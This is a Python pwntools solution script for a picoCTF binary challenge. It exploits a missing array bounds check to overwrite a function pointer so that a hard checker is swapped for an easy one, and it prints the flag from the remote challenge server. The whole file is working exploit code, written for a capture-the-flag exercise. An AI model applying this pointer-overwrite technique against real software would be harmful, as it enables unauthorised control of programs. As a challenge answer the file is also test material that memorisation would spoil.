'''
tags: `func ptr`, `array`, `boundary check`

overwrite `check` to call easy instead of hard
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 53523

elf = ELF('./vuln')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b vuln
b easy_checker
b calculate_story_score
'''

easy_checker = elf.symbols['easy_checker']
hard_checker = elf.symbols['hard_checker']
check = elf.symbols['check']
fun = elf.symbols['fun']

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'>> ')
    payload = b'\x7f' * 10 + b'\x43'
    r.sendline(payload)
    r.recvuntil(b'.\n')
    payload = f'{str((check - fun) // 4)} {str(easy_checker - hard_checker)}'
    r.sendline(payload.encode())
    r.recvuntil(b'flag.\n')
    print (r.recvline()[:-1].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()